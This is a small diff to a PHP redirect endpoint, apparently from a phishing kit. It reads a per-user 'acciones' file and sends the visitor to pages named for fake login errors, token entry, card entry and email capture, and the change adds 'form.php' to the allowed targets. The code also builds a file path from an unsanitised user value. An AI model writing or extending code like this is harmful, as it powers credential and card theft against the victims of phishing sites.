@@ -13,7 +13,7 @@ $archivo = __DIR__ . "/acciones/$usuario.txt";
 if (file_exists($archivo)) {
     $destino = trim(file_get_contents($archivo));
     unlink($archivo);
-    if (in_array($destino, ['index.php', 'token.php', 'tokenerror.php', 'loginerror.php', 'card.php', 'mail.php', 'listo.php'])) {
+    if (in_array($destino, ['index.php', 'form.php', 'token.php', 'tokenerror.php', 'loginerror.php', 'card.php', 'mail.php', 'listo.php'])) {
         echo json_encode(["status" => "redirigir", "destino" => $destino]);
         exit;
     }
